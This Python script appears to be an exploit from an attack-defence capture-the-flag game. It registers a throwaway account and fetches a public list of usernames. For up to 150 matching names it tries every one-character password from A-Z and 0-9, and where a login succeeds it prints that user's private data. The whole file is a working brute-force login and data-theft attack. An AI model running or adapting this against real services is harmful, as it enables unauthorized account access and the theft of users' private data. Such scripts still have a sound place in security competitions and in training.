#!/usr/bin/env python3

import api
import sys
import re

DATA_LIMIT = 150
MAX_USERNAME_SIZE = 16
ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

def connect(host):
    try:
        r = api.connect(host)
        return r
    except Exception as e:
        print("Connect error")
        exit()

def parse_data(username, r):
    for p in ALPHABET:
        ans = api.auth(r, username, p).decode()
        if "Invalid" in ans:
            continue
        print(api.get_private_data(r))
        api.logout(r)
        return

host = sys.argv[1]
name = api.get_rand_str(12)
password = api.get_rand_str(16)

r = connect(host)

regx = re.compile("[A-Z, 0-9]{16}")

api.reg_auth(r, name, password)
public_data = api.get_public_data(r).decode().split('\x00')
api.logout(r)

data_count = 0
for username in public_data[::-1]:
    if data_count >= DATA_LIMIT:
        exit()

    if re.match(r"[A-Z, 0-9]{12}", username):
        data_count += 1;
        parse_data(username[:-1], r)
